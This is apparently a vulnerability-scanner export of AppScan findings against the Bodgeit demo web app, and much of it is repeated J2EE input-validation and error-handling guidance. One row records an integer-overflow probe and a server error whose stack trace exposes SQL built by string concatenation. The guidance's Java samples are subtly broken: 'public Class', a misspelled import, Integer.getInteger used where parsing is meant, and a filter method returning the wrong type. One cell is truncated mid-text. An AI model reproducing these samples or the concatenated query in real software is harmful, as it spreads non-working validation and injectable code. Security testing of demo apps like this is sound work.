<br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","102","Integer Overflow","","Info","Open","2015-10-15","IBM Security AppScan Standard","190","Integer Overflow or Wraparound","","/bodgeit/basket.jsp","price","","http://localhost/bodgeit/basket.jsp","Parameter: price=0.7 -> price=18446744073709551617","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=11 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 50 productid=11&price=18446744073709551617&quantity=1 HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3069 Date: Thu, 15 Oct 2015 22:23:10 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 189</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 189</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 189 186: quantity += rs.getInt(&quot;quantity&quot;); 187: rs.close(); 188: stmt.close(); 189: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(quantity) + 190: &quot; WHERE basketid=&quot; + basketId + &quot; AND productid = &quot; + productId); 191: stmt.execute(); 192: if (Integer.parseInt(quantity) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;11111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> <br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed 